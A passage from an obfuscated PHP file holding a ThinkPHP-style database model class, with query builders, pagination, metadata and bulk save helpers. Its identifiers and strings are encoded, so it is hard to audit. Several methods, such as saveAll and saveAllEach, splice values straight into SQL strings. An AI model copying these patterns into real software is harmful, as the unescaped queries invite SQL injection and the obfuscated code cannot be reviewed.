$this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $Äğ—¹± =& $_SERVER[–Ú¬çÁ]; return isset($this->fields[$Äğ—¹±[304]]) ? $this->fields[$Äğ—¹±[304]] : $this->pk; } public function getDbFields() { $¨ ¦ Í¡ =& $_SERVER[–Ú¬çÁ]; if (isset($this->options[$¨ ¦ Í¡[332]])) { $„Ú·šã = $this->db->getFields($this->options[$¨ ¦ Í¡[332]]); return $„Ú·šã ? array_keys($„Ú·šã) : !1; } if ($this->fields) { $„Ú·šã = $this->fields; unset($„Ú·šã[$¨ ¦ Í¡[303]], $„Ú·šã[$¨ ¦ Í¡[304]], $„Ú·šã[$¨ ¦ Í¡[305]], $„Ú·šã[$¨ ¦ Í¡[302]]); return $„Ú·šã; } return !1; } public function data($¨ùó×îÄ = '') { $»ÖÛ¥ßş =& $_SERVER[–Ú¬çÁ]; if ($»ÖÛ¥ßş[12] === $¨ùó×îÄ && !empty($this->data)) { return $this->data; } if (is_object($¨ùó×îÄ)) { $¨ùó×îÄ = get_object_vars($¨ùó×îÄ); } elseif (is_string($¨ùó×îÄ)) { parse_str($¨ùó×îÄ, $¨ùó×îÄ); } elseif (!is_array($¨ùó×îÄ)) { think_exception(think_lang($»ÖÛ¥ßş[324])); } $this->data = $¨ùó×îÄ; return $this; } public function join($·©ĞË¢) { $àİ¹şÌ =& $_SERVER[–Ú¬çÁ]; if (is_array($·©ĞË¢)) { $this->options[$àİ¹şÌ[335]] = $·©ĞË¢; } elseif (!empty($·©ĞË¢)) { $this->options[$àİ¹şÌ[335]][] = $·©ĞË¢; } return $this; } public function union($€¹¿¨î, $Ö¶©­àê = false) { $ºûéºªÔ =& $_SERVER[–Ú¬çÁ]; if (empty($€¹¿¨î)) { return $this; } if ($Ö¶©­àê) { $this->options[$ºûéºªÔ[400]][$ºûéºªÔ[401]] = !0; } if (is_object($€¹¿¨î)) { $€¹¿¨î = get_object_vars($€¹¿¨î); } if (is_string($€¹¿¨î)) { $¾¯©Ç‘ä = $€¹¿¨î; } elseif (is_array($€¹¿¨î)) { if (isset($€¹¿¨î[0])) { $this->options[$ºûéºªÔ[400]] = array_merge($this->options[$ºûéºªÔ[400]], $€¹¿¨î); return $this; } else { $¾¯©Ç‘ä = $€¹¿¨î; } } else { think_exception(think_lang($ºûéºªÔ[324])); } $this->options[$ºûéºªÔ[400]][] = $¾¯©Ç‘ä; return $this; } public function cache($…ÄÒû— = true, $ó·°ÊÍÑ = null, $ÓÖ§´¹¨ = '') { $Ö¼ø†İë =& $_SERVER[–Ú¬çÁ]; if (!1 !== $…ÄÒû—) { $this->options[$Ö¼ø†İë[402]] = array($Ö¼ø†İë[94] => $…ÄÒû—, $Ö¼ø†İë[392] => $ó·°ÊÍÑ, $Ö¼ø†İë[33] => $ÓÖ§´¹¨); } return $this; } public function field($—¯†ª•Ä, $íñØŸˆ = false) { $•ó»”“á =& $_SERVER[–Ú¬çÁ]; if (!0 === $—¯†ª•Ä) { $º‘’²ú = $this->getDbFields(); $—¯†ª•Ä = $º‘’²ú ? $º‘’²ú : $•ó»”“á[213]; } elseif ($íñØŸˆ) { if (is_string($—¯†ª•Ä)) { $—¯†ª•Ä = explode($•ó»”“á[50], $—¯†ª•Ä); } $º‘’²ú = $this->getDbFields(); $—¯†ª•Ä = $º‘’²ú ? array_diff($º‘’²ú, $—¯†ª•Ä) : $—¯†ª•Ä; } $this->options[$•ó»”“á[326]] = $—¯†ª•Ä; return $this; } public function scope($¹£ë–•Í = '', $Û‘ºê»Å = NULL) { $ıõÃ» ì =& $_SERVER[–Ú¬çÁ]; if ($ıõÃ» ì[12] === $¹£ë–•Í) { if (isset($this->_scope[$ıõÃ» ì[37]])) { $È”„¸—« = $this->_scope[$ıõÃ» ì[37]]; } else { return $this; } } elseif (is_string($¹£ë–•Í)) { $ÏİÚõî = explode($ıõÃ» ì[50], $¹£ë–•Í); $È”„¸—« = array(); foreach ($ÏİÚõî as $·ÉóÆ¹‰) { if (!isset($this->_scope[$·ÉóÆ¹‰])) { continue; } $È”„¸—« = array_merge($È”„¸—«, $this->_scope[$·ÉóÆ¹‰]); } if (!empty($Û‘ºê»Å) && is_array($Û‘ºê»Å)) { $È”„¸—« = array_merge($È”„¸—«, $Û‘ºê»Å); } } elseif (is_array($¹£ë–•Í)) { $È”„¸—« = $¹£ë–•Í; } if (is_array($È”„¸—«) && !empty($È”„¸—«)) { $this->options = array_merge($this->options, array_change_key_case($È”„¸—«)); } return $this; } public function where($ı½£§¿, $Ìù„‡†Î = null) { $ù¶¤ÙŒŠ =& $_SERVER[–Ú¬çÁ]; if (!is_null($Ìù„‡†Î) && is_string($ı½£§¿)) { if (!is_array($Ìù„‡†Î)) { $Ìù„‡†Î = func_get_args(); array_shift($Ìù„‡†Î); } $Ìù„‡†Î = array_map(array($this->db, $ù¶¤ÙŒŠ[396]), $Ìù„‡†Î); $ı½£§¿ = vsprintf($ı½£§¿, $Ìù„‡†Î); } elseif (is_object($ı½£§¿)) { $ı½£§¿ = get_object_vars($ı½£§¿); } elseif (is_array($ı½£§¿)) { foreach ($ı½£§¿ as $¦°ªè => $ó’â¥Ôè) { if ((is_numeric($¦°ªè) || !$¦°ªè) && is_string($ó’â¥Ôè)) { if (strpos($ó’â¥Ôè, $ù¶¤ÙŒŠ[403]) === 0) { continue; } think_trace($ù¶¤ÙŒŠ[404], $ù¶¤ÙŒŠ[12], $ù¶¤ÙŒŠ[49]); die; } } } if (is_string($ı½£§¿) && $ù¶¤ÙŒŠ[12] != $ı½£§¿) { $Îº¦ë—É = array(); $Îº¦ë—É[$ù¶¤ÙŒŠ[405]] = $ı½£§¿; $ı½£§¿ = $Îº¦ë—É; } if (isset($this->options[$ù¶¤ÙŒŠ[328]])) { $this->options[$ù¶¤ÙŒŠ[328]] = array_merge($this->options[$ù¶¤ÙŒŠ[328]], $ı½£§¿); } else { $this->options[$ù¶¤ÙŒŠ[328]] = $ı½£§¿; } return $this; } public function limit($Ö†øì, $ï¼Â†Í = null) { $İ…¢´¢  =& $_SERVER[–Ú¬çÁ]; $this->options[$İ…¢´¢ [345]] = is_null($ï¼Â†Í) ? $Ö†øì : $Ö†øì . $İ…¢´¢ [50] . $ï¼Â†Í; return $this; } public function page($Ä†ş¸…Ñ, $æ“¯ñÒ = null) { $Ÿ„§ößÓ =& $_SERVER[–Ú¬çÁ]; $this->options[$Ÿ„§ößÓ[406]] = is_null($æ“¯ñÒ) ? $Ä†ş¸…Ñ : $Ä†ş¸…Ñ . $Ÿ„§ößÓ[50] . $æ“¯ñÒ; return $this; } public function comment($âÍß„˜) { $this->options[$_SERVER[–Ú¬çÁ][407]] = $âÍß„˜; return $this; } public function setProperty($ÀïÙÜ«Ù, $æõ¹×àê) { if (property_exists($this, $ÀïÙÜ«Ù)) { $this->{$ÀïÙÜ«Ù} = $æõ¹×àê; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\144\x69\146\171\x54\x69\155\x65", "\x74\x69\x6d\145", "\151\156\163\x65\x72\164\x2c\x75\x70\144\x61\x74\x65", "\x66\x75\x6e\143\x74\x69\x6f\x6e"), array("\x63\162\x65\x61\164\145\x54\151\155\145", "\x74\151\x6d\x65", "\x69\156\x73\145\162\164", "\x66\x75\x6e\143\x74\x69\x6f\x6e")); public function setDataAuto($¯ÏØ±Õ®) { $this->dataAuto = $¯ÏØ±Õ®; } public function __construct($š£ş·Àï = '', $ÙÓ ÃôÇ = '', $€õò¶¬¡ = '') { parent::__construct($š£ş·Àï, $ÙÓ ÃôÇ, $€õò¶¬¡); } protected $tableMeta = array(); protected function _beforeInsert(&$ÖÕ§ä”Ÿ, $Ûò³†åã) { $Çî‹ÅË½ =& $_SERVER[–Ú¬çÁ]; if (!$this->checkDataAutoHas($Çî‹ÅË½[408])) { return; } $this->dataBeforeFilter($ÖÕ§ä”Ÿ, $Çî‹ÅË½[408]); } protected function _beforeUpdate(&$³°À¾°™, $ú¹ÂõÑ¨) { $Áû«†‡Ğ =& $_SERVER[–Ú¬çÁ]; if (!$this->checkDataAutoHas($Áû«†‡Ğ[409])) { return; } $this->dataBeforeFilter($³°À¾°™, $Áû«†‡Ğ[409]); } protected function _afterSelect(&$á®É§´¥, $”â™¼Ÿ) { if (!is_array($á®É§´¥)) { return; } if (!$this->checkDataAutoHas($_SERVER[–Ú¬çÁ][410])) { return; } foreach ($á®É§´¥ as &$Úš›ãÇ) { $this->dataAfterFilter($Úš›ãÇ); } unset($Úš›ãÇ); } protected function _afterFind(&$¹—…ñªğ, $ïº¡«) { if (!is_array($¹—…ñªğ)) { return; } if (!$this->checkDataAutoHas($_SERVER[–Ú¬çÁ][410])) { return; } $this->dataAfterFilter($¹—…ñªğ); } public static function textEncode($æÇôÓı ) { if (!$æÇôÓı ) { return $æÇôÓı ; } $áŸÔ¾ŞØ = json_encode($æÇôÓı ); $áŸÔ¾ŞØ = preg_replace_callback($_SERVER[–Ú¬çÁ][411], function ($Éô¬ßë) { return addslashes($Éô¬ßë[0]); }, $áŸÔ¾ŞØ); return json_decode($áŸÔ¾ŞØ); } public static function textDecode($ı¡ş¾ğÀ) { $«´Ç®¸ó =& $_SERVER[–Ú¬çÁ]; $§è¡¸¿ = json_encode($ı¡ş¾ğÀ); $§è¡¸¿ = preg_replace_callback($«´Ç®¸ó[412], function ($â¨ªä•“) { return $_SERVER[–Ú¬çÁ][97]; }, $§è¡¸¿); return json_decode($§è¡¸¿); } public function setAutoIncrement($’´Õ˜›) { $²èáÎ› = array($this->getPk() => $’´Õ˜›); $½íõ èÕ = $this->data($²èáÎ›)->add(); if ($½íõ èÕ) { $this->delete($½íõ èÕ); } } public function getAutoIncrement() { $ë£ı´²İ = $this->getTableName(); $ÃÚ‹¡ã® = $this->max($this->getPk()); $¢Äªª­ = $this->query("\x73\x68\x6f\167\40\164\141\x62\x6c\x65\x20\x73\164\141\164\165\x73\40\167\x68\145\x72\x65\x20\116\141\155\145\x3d\x27{$ë£ı´²İ}\x27"); $¨½­ä¶ô = $¢Äªª­[0][$_SERVER[–Ú¬çÁ][413]]; $÷ó´‰ºˆ = max($ÃÚ‹¡ã®, $¨½­ä¶ô); return $÷ó´‰ºˆ; } protected function _callBefore($›ÅàÂäú, $ÊÃğ·¥Ø) { return $this->cacheCallCheck($›ÅàÂäú, $ÊÃğ·¥Ø, !1); } protected function _callAfter($´¾ã®¨¤, $ÕõĞÕè®) { return $this->cacheCallCheck($´¾ã®¨¤, $ÕõĞÕè®, !0); } protected function cacheFunctionAlias($‹……êé¼) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($ıûæÖŞú, $³Å”üò, $ä± œéÁ = false) { $“Åû²şÅ = $this->cacheFunctionAlias($³Å”üò); if (!$“Åû²şÅ) { return; } foreach ($“Åû²şÅ as $íÅ·°ºõ => $›ûé•ªÜ) { $ê¬ãì§¤ = $›ûé•ªÜ[0]; $°á¾ßìí = explode($_SERVER[–Ú¬çÁ][50], $›ûé•ªÜ[1]); if ($ıûæÖŞú == $íÅ·°ºõ) { return $this->cacheFunctionGet($íÅ·°ºõ, $ê¬ãì§¤); } if ($ä± œéÁ && in_array($ıûæÖŞú, $°á¾ßìí)) { $this->cacheFunctionClear($íÅ·°ºõ, $ê¬ãì§¤); } } } public function cacheFunctionGet($—Õ‘ãä, $ÖÁ”©„) { $ğ¬½İ®É = $this->cacheKeyMake($—Õ‘ãä, $ÖÁ”©„); $ÊÄàõÑ = Cache::get($ğ¬½İ®É); if (!is_array($ÊÄàõÑ)) { $ÊÄàõÑ = call_user_func_array(array($this, $—Õ‘ãä), array($ÖÁ”©„, !0)); Cache::set($ğ¬½İ®É, $ÊÄàõÑ); } return $ÊÄàõÑ; } public function cacheFunctionClear($”½€•‹°, $Œ”Êâ½) { $ê·ø© = $Œ”Êâ½; if (!is_array($Œ”Êâ½)) { $ê·ø© = array($Œ”Êâ½); } foreach ($ê·ø© as $¶Áşàœ) { $úÓ£†Æ³ = $this->cacheKeyMake($”½€•‹°, $¶Áşàœ); Cache::remove($úÓ£†Æ³); } } private function cacheKeyMake($¦¤±©ğœ, $¡äªğÚ) { $¡âÇ¢‹ =& $_SERVER[–Ú¬çÁ]; return get_class($this) . $¡âÇ¢‹[11] . $¦¤±©ğœ . $¡âÇ¢‹[414] . $¡äªğÚ; } protected function selectPageReset() { $×Óõ±†Ë =& $_SERVER[–Ú¬çÁ]; if (isset($GLOBALS[$×Óõ±†Ë[415]])) { return; } $GLOBALS[$×Óõ±†Ë[415]] = isset($GLOBALS[$×Óõ±†Ë[7]][$×Óõ±†Ë[416]]) ? $GLOBALS[$×Óõ±†Ë[7]][$×Óõ±†Ë[416]] : !1; $GLOBALS[$×Óõ±†Ë[417]] = isset($GLOBALS[$×Óõ±†Ë[7]][$×Óõ±†Ë[406]]) ? $GLOBALS[$×Óõ±†Ë[7]][$×Óõ±†Ë[406]] : !1; $GLOBALS[$×Óõ±†Ë[7]][$×Óõ±†Ë[416]] = !1; $GLOBALS[$×Óõ±†Ë[7]][$×Óõ±†Ë[406]] = !1; } protected function selectPageRestore() { $±à·î‘ö =& $_SERVER[–Ú¬çÁ]; if (!isset($GLOBALS[$±à·î‘ö[415]])) { return; } $GLOBALS[$±à·î‘ö[7]][$±à·î‘ö[416]] = $GLOBALS[$±à·î‘ö[415]]; $GLOBALS[$±à·î‘ö[7]][$±à·î‘ö[406]] = $GLOBALS[$±à·î‘ö[417]]; if ($GLOBALS[$±à·î‘ö[7]][$±à·î‘ö[416]] === !1) { unset($GLOBALS[$±à·î‘ö[7]][$±à·î‘ö[416]]); } if ($GLOBALS[$±à·î‘ö[7]][$±à·î‘ö[406]] === !1) { unset($GLOBALS[$±à·î‘ö[7]][$±à·î‘ö[406]]); } unset($GLOBALS[$±à·î‘ö[415]]); unset($GLOBALS[$±à·î‘ö[417]]); } protected function selectPage($ØõÜ¬Ñê = 200, $¬æ¥•÷ï = 1) { $¿şàĞÙ³ =& $_SERVER[–Ú¬çÁ]; global $in; $â”çµÃ = $this->optionsValue(); $ÇÉÈ˜İ‘ = 50000; $ØõÜ¬Ñê = isset($in[$¿şàĞÙ³[416]]) && $in[$¿şàĞÙ³[416]] ? $in[$¿şàĞÙ³[416]] : $ØõÜ¬Ñê; if ($ØõÜ¬Ñê === -1) { $in[$¿şàĞÙ³[416]] = !1; $ÇÉÈ˜İ‘ = 100000000; $ØõÜ¬Ñê = $ÇÉÈ˜İ‘; } $ù©£º€ƒ = $â”çµÃ; $ù©£º€ƒ[$¿şàĞÙ³[418]] = array(); $ØõÜ¬Ñê = intval($ØõÜ¬Ñê); $ØõÜ¬Ñê = $ØõÜ¬Ñê <= 5 ? 5 : ($ØõÜ¬Ñê >= $ÇÉÈ˜İ‘ ? $ÇÉÈ˜İ‘ : $ØõÜ¬Ñê); $¬æ¥•÷ï = intval(isset($in[$¿şàĞÙ³[406]]) && $in[$¿şàĞÙ³[406]] ? $in[$¿şàĞÙ³[406]] : $¬æ¥•÷ï); $¬æ¥•÷ï = $¬æ¥•÷ï <= 1 ? 1 : $¬æ¥•÷ï; $˜½¿îÙé = array(); $‚¥ÅıÕ¸ = 1; if ($¬æ¥•÷ï == 1 && $‚¥ÅıÕ¸) { $this->optionsValue($â”çµÃ); $˜½¿îÙé = $this->page($¬æ¥•÷ï, $ØõÜ¬Ñê)->select(); $…øÍ§è = is_array($˜½¿îÙé) ? count($˜½¿îÙé) : 0; if ($…øÍ§è < $ØõÜ¬Ñê) { $ÚÂêûşß = 1; } else { $this->optionsValue($ù©£º€ƒ); $…øÍ§è = intval($this->count()); $ÚÂêûşß = ceil($…øÍ§è / $ØõÜ¬Ñê); } } else { $this->optionsValue($ù©£º€ƒ); $…øÍ§è = intval($this->count()); $ÚÂêûşß = ceil($…øÍ§è / $ØõÜ¬Ñê); $¬æ¥•÷ï = $¬æ¥•÷ï >= $ÚÂêûşß ? $ÚÂêûşß : $¬æ¥•÷ï; $this->optionsValue($â”çµÃ); $˜½¿îÙé = $this->page($¬æ¥•÷ï, $ØõÜ¬Ñê)->select(); } if (!is_array($˜½¿îÙé)) { $˜½¿îÙé = array(); } if ($ÚÂêûşß == 1) { $…øÍ§è = count($˜½¿îÙé); } $¥æ½ÃÜ• = array($¿şàĞÙ³[419] => array($¿şàĞÙ³[420] => $…øÍ§è, $¿şàĞÙ³[416] => $ØõÜ¬Ñê, $¿şàĞÙ³[406] => $¬æ¥•÷ï, $¿şàĞÙ³[421] => $ÚÂêûşß), $¿şàĞÙ³[422] => $˜½¿îÙé); return $¥æ½ÃÜ•; } protected function checkLength($ÊôÔÀ‘ç, $¢‹õ¶ùø = 0, $ğ‡Ò˜õÊ = '') { $ˆÖ×ìğù =& $_SERVER[–Ú¬çÁ]; $¢‹õ¶ùø = $¢‹õ¶ùø ? $¢‹õ¶ùø : 65536; if (!$ÊôÔÀ‘ç || strlen($ÊôÔÀ‘ç) < $¢‹õ¶ùø) { return; } $ğ‡Ò˜õÊ = $ğ‡Ò˜õÊ ? $ğ‡Ò˜õÊ . $ˆÖ×ìğù[71] : $ˆÖ×ìğù[12]; show_json($ğ‡Ò˜õÊ . LNG($ˆÖ×ìğù[423]) . "\50{$¢‹õ¶ùø}\x29", !1); } protected function metaSet($Ç½çƒ˜», $şÛï«ñ = null, $Óó½‡¦Ë = null) { $µŸ§Ô²ò =& $_SERVER[–Ú¬çÁ]; if (!$this->tableMeta || !$Ç½çƒ˜») { return !1; } $Í–¾ÚŞÍ = $this->tableMeta[$µŸ§Ô²ò[424]]; $ñ„®ã€ = $this->tableMeta[$µŸ§Ô²ò[425]]; $‚ìÂŞ×Ü = Model($ñ„®ã€); $†ú«¦©¼ = array($Í–¾ÚŞÍ => $Ç½çƒ˜», $µŸ§Ô²ò[426] => $şÛï«ñ); if (is_null($şÛï«ñ)) { return $‚ìÂŞ×Ü->where(array($Í–¾ÚŞÍ => $Ç½çƒ˜»))->delete(); } if (is_null($Óó½‡¦Ë) && is_string($şÛï«ñ)) { return $‚ìÂŞ×Ü->where($†ú«¦©¼)->delete(); } $ªŞ®ú½ = is_array($şÛï«ñ) ? $şÛï«ñ : array(); if (is_string($şÛï«ñ)) { $ªŞ®ú½[$şÛï«ñ] = $Óó½‡¦Ë; } $àíîãşæ = array(); foreach ($ªŞ®ú½ as $Ö¸ñ˜êı => $Øäå†‘) { if (is_null($Øäå†‘) && is_string($Ö¸ñ˜êı)) { $‚ìÂŞ×Ü->where(array($Í–¾ÚŞÍ => $Ç½çƒ˜», $µŸ§Ô²ò[426] => $Ö¸ñ˜êı))->delete(); continue; } $this->checkLength($Øäå†‘, !1, $ñ„®ã€ . $µŸ§Ô²ò[4] . $Ö¸ñ˜êı); $àíîãşæ[] = array($Í–¾ÚŞÍ => $Ç½çƒ˜», $µŸ§Ô²ò[94] => $Ö¸ñ˜êı, $µŸ§Ô²ò[427] => $Øäå†‘); } $ãˆîÙ÷Ğ = $µŸ§Ô²ò[428] . $ñ„®ã€; CacheLock::lock($ãˆîÙ÷Ğ); $‚ìÂŞ×Ü->where(array($Í–¾ÚŞÍ => $Ç½çƒ˜»))->addAll($àíîãşæ, array(), !0); CacheLock::unlock($ãˆîÙ÷Ğ); return !0; } public function metaGet($§ÆÂ÷ŒÜ, $ùğ«ê¬¿ = false) { $Ñû¼µ½ =& $_SERVER[–Ú¬çÁ]; if (!$this->tableMeta) { return array(); } $îöà²ê = $this->tableMeta[$Ñû¼µ½[424]]; $µéš›Ó = Model($this->tableMeta[$Ñû¼µ½[425]]); if ($ùğ«ê¬¿) { $÷§©Èî = array($îöà²ê => $§ÆÂ÷ŒÜ, $Ñû¼µ½[94] => $ùğ«ê¬¿); return $µéš›Ó->where($÷§©Èî)->getField($Ñû¼µ½[427]); } $÷§©Èî = array($îöà²ê => $§ÆÂ÷ŒÜ); $úï¥ñå = $µéš›Ó->field($Ñû¼µ½[429])->where($÷§©Èî)->select(); $úï¥ñå = array_to_keyvalue($úï¥ñå, $Ñû¼µ½[94], $Ñû¼µ½[427]); return $úï¥ñå; } private function checkDataAutoHas($Ç™¢ú‘•) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $öÒ ½²) { if (in_array($Ç™¢ú‘•, explode($_SERVER[–Ú¬çÁ][50], $öÒ ½²[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$öİàÃÖã, $³¼íí¿ñ) { $œªëåß =& $_SERVER[–Ú¬çÁ]; if (!is_array($öİàÃÖã)) { return; } foreach ($this->dataAuto as $İåÕñËÅ) { $Ò÷Ê¿ãé = $İåÕñËÅ[0]; if (!in_array($³¼íí¿ñ, explode($œªëåß[50], $İåÕñËÅ[2]))) { continue; } switch (trim($İåÕñËÅ[3])) { case $œªëåß[374]: case $œªëåß[375]: $ƒÃ ‡… = $İåÕñËÅ[1]; $¡ÍûÛ¼ = isset($İåÕñËÅ[4]) ? (array) $İåÕñËÅ[4] : array(); if ($ƒÃ ‡… == $œªëåß[194] && array_key_exists($Ò÷Ê¿ãé, $öİàÃÖã)) { if (!$öİàÃÖã[$Ò÷Ê¿ãé]) { unset($öİàÃÖã[$Ò÷Ê¿ãé]); } break; } if (isset($öİàÃÖã[$Ò÷Ê¿ãé])) { array_unshift($¡ÍûÛ¼, $öİàÃÖã[$Ò÷Ê¿ãé]); } if ($œªëåß[374] == $İåÕñËÅ[3]) { $öİàÃÖã[$Ò÷Ê¿ãé] = call_user_func_array($ƒÃ ‡…, $¡ÍûÛ¼); } else { $öİàÃÖã[$Ò÷Ê¿ãé] = call_user_func_array(array(&$this, $ƒÃ ‡…), $¡ÍûÛ¼); } break; case $œªëåß[323]: if (isset($öİàÃÖã[$Ò÷Ê¿ãé]) && $öİàÃÖã[$Ò÷Ê¿ãé]) { $öİàÃÖã[$Ò÷Ê¿ãé] = call_user_func_array(array(&$this, $İåÕñËÅ[1]), array($öİàÃÖã[$Ò÷Ê¿ãé])); } break; case $œªëåß[326]: $öİàÃÖã[$Ò÷Ê¿ãé] = $öİàÃÖã[$İåÕñËÅ[1]]; break; case $œªëåß[347]: if (isset($öİàÃÖã[$Ò÷Ê¿ãé]) && !is_string($öİàÃÖã[$Ò÷Ê¿ãé])) { $öİàÃÖã[$Ò÷Ê¿ãé] = json_encode_force($öİàÃÖã[$Ò÷Ê¿ãé]); } break; case $œªëåß[376]: if ($öİàÃÖã[$Ò÷Ê¿ãé] === $œªëåß[12]) { unset($öİàÃÖã[$Ò÷Ê¿ãé]); } break; case $œªëåß[377]: $öİàÃÖã[$Ò÷Ê¿ãé] = $İåÕñËÅ[1]; default: break; } } if ($³¼íí¿ñ == $œªëåß[408]) { $·ÄÊ„İÆ = strtolower($this->db->getDbType()); if (strpos($·ÄÊ„İÆ, $œªëåß[13]) !== 0) { return; } $éâš‡À = $this->field(!0)->fields; $Î¢±Š¿… = $éâš‡À[$œªëåß[305]]; if (isset($éâš‡À[$œªëåß[304]])) { unset($Î¢±Š¿…[$éâš‡À[$œªëåß[304]]]); } foreach ($Î¢±Š¿… as $ßˆœÂÈî => $³¼íí¿ñ) { if (!isset($öİàÃÖã[$ßˆœÂÈî])) { $öİàÃÖã[$ßˆœÂÈî] = $œªëåß[12]; } } } } private function dataAfterFilter(&$Äìˆ½òæ) { $ØÑ­ =& $_SERVER[–Ú¬çÁ]; foreach ($this->dataAuto as $•´˜°Åç) { $ß²”ü·ø = $•´˜°Åç[0]; if (!isset($Äìˆ½òæ[$ß²”ü·ø])) { continue; } if (!in_array($ØÑ­[410], explode($ØÑ­[50], $•´˜°Åç[2]))) { continue; } switch (trim($•´˜°Åç[3])) { case $ØÑ­[374]: case $ØÑ­[375]: $ªşŠ‘ö = isset($•´˜°Åç[4]) ? (array) $•´˜°Åç[4] : array(); array_unshift($ªşŠ‘ö, $Äìˆ½òæ[$ß²”ü·ø]); if (isset($•´˜°Åç[4]) && $•´˜°Åç[4] == $ØÑ­[430]) { $ªşŠ‘ö = array($Äìˆ½òæ[$ß²”ü·ø]); } if ($ØÑ­[374] == $•´˜°Åç[3]) { $Äìˆ½òæ[$ß²”ü·ø] = call_user_func_array($•´˜°Åç[1], $ªşŠ‘ö); } else { $Äìˆ½òæ[$ß²”ü·ø] = call_user_func_array(array(&$this, $•´˜°Åç[1]), $ªşŠ‘ö); } break; case $ØÑ­[323]: if (isset($Äìˆ½òæ[$ß²”ü·ø]) && $Äìˆ½òæ[$ß²”ü·ø]) { $Äìˆ½òæ[$ß²”ü·ø] = call_user_func_array(array(&$this, $•´˜°Åç[1]), array($Äìˆ½òæ[$ß²”ü·ø])); } break; case $ØÑ­[326]: $Äìˆ½òæ[$ß²”ü·ø] = $Äìˆ½òæ[$•´˜°Åç[1]]; break; case $ØÑ­[347]: $ï×ÏÆÀê = $Äìˆ½òæ[$ß²”ü·ø]; $Äìˆ½òæ[$ß²”ü·ø] = json_decode($ï×ÏÆÀê, !0); if (is_null($Äìˆ½òæ[$ß²”ü·ø])) { $Äìˆ½òæ[$ß²”ü·ø] = $ï×ÏÆÀê; } break; case $ØÑ­[376]: if ($Äìˆ½òæ[$ß²”ü·ø] === $ØÑ­[12]) { unset($Äìˆ½òæ[$ß²”ü·ø]); } break; case $ØÑ­[377]: $Äìˆ½òæ[$ß²”ü·ø] = $•´˜°Åç[1]; break; default: break; } } } public function saveAll($’…¶†‘œ) { $ªŞºŒ¿ =& $_SERVER[–Ú¬çÁ]; $ÏØŠÔŞâ = $this->tablePrefix . $this->tableName; $´ÃÆÔ÷¹ = self::SQL_WHERE_IN_CHUNK; $’…¶†‘œ = is_array($’…¶†‘œ) ? $’…¶†‘œ : array(); $¬ùÇ±• = $ªŞºŒ¿[431]; $ôûòÀğü = 0; $êşÌ²Õ = array(); $ÄûûİÔì = count($’…¶†‘œ); for ($ÔÆî™µ = 0; $ÔÆî™µ < $ÄûûİÔì; $ÔÆî™µ++) { $¯¹İñ¯ = $’…¶†‘œ[$ÔÆî™µ]; if (!is_array($¯¹İñ¯) || count($¯¹İñ¯) != 4) { continue; } $¡…ª‹ì = "\x55\x50\104\x41\124\x45\40\140{$ÏØŠÔŞâ}\140\x20\123\x45\124\x20{$¯¹İñ¯[2]}\40\x3d\40\x43\101\123\105\x20{$¯¹İñ¯[0]}\40\xa"; if ($ôûòÀğü == 0) { $¬ùÇ±• = $¡…ª‹ì; } $êşÌ²Õ[] = $ªŞºŒ¿[118] . $¯¹İñ¯[1] . $ªŞºŒ¿[118]; $ôûòÀğü++; $¬ùÇ±• .= "\40\127\110\105\x4e\x20\47{$¯¹İñ¯[1]}\47\40\124\110\x45\116\40\x27{$¯¹İñ¯[3]}\47\x20\12"; if ($ôûòÀğü == $´ÃÆÔ÷¹ || $ÔÆî™µ == $ÄûûİÔì - 1) { $…è°ğ€Ú = implode($ªŞºŒ¿[50], $êşÌ²Õ); $¬ùÇ±• .= "\40\x45\116\104\40\40\127\x48\x45\x52\x45\40{$¯¹İñ¯[0]}\x20\111\116\x20\50{$…è°ğ€Ú}\51\x20"; $this->execute($¬ùÇ±•); $ôûòÀğü = 0; $¬ùÇ±• = $¡…ª‹ì; $this->chunkEventCheck(count($êşÌ²Õ)); $êşÌ²Õ = array(); } } $this->chunkEventSet(); } public function saveAllEach($÷Áˆº¯) { $¬’ùé”­ =& $_SERVER[–Ú¬çÁ]; $İ•ùÂË‰ = $this->tablePrefix . $this->tableName; foreach ($÷Áˆº¯ as $†ñÊáÃ) { if (!is_array($†ñÊáÃ) || count($†ñÊáÃ) != 4) { continue; } $¨Ä‡‰ = $†ñÊáÃ[0] . $¬’ùé”­[432] . $†ñÊáÃ[1] . $¬’ùé”­[118]; $ºÁÆ†õô = $†ñÊáÃ[2] . $¬’ùé”­[432] . $†ñÊáÃ[3] . $¬’ùé”­[118]; $°êü³Õ = "\165\160\x64\x61\164\145\x20{$İ•ùÂË‰}\40\163\145\x74\x20{$ºÁÆ†õô}\x20\167\150\145\162\x65\x20{$¨Ä‡‰}\x3b"; $this->execute($°êü³Õ); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ÅÕô¡“¤ = false, $¹œ·ŞÂ = false) { $this->_chunkEvent = $ÅÕô¡“¤; $this->_chunkEventParam = $¹œ·ŞÂ; } private function chunkEventCheck($‚ŞŒóù) { if (!$this->_chunkEvent) { return; } $û¦çˆ¸Î = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $û¦çˆ¸Î[$_SERVER[–Ú¬çÁ][433]] = $‚ŞŒóù; Hook::trigger($this->_chunkEvent, $û¦çˆ¸Î); } public function addAll($û«Ÿ·İ³, $¶Ú‡“† = array(), $‰º’Ôı‹ = false) { $°Ü¬ ‹ =& $_SERVER[–Ú¬çÁ]; ignore_timeout(); $×‚ŠÓíá = self::SQL_WHERE_IN_CHUNK; if (empty($û«Ÿ·İ³)) { $this->error = think_lang($°Ü¬ ‹[324]); return !1; } $¶Ú‡“† = $this->_parseOptions($¶Ú‡“†); foreach ($û«Ÿ·İ³ as $¨€„‰Ó => $âÎ¦È¦) { $û«Ÿ·İ³[$¨€„‰Ó] = $this->_facade($âÎ¦È¦); $this->_beforeInsert($û«Ÿ·İ³[$¨€„‰Ó], $¶Ú‡“†); } if (method_exists($this->db, $°Ü¬ ‹[325])) { for ($¥¼»ÍÛ = 0; $¥¼»ÍÛ < 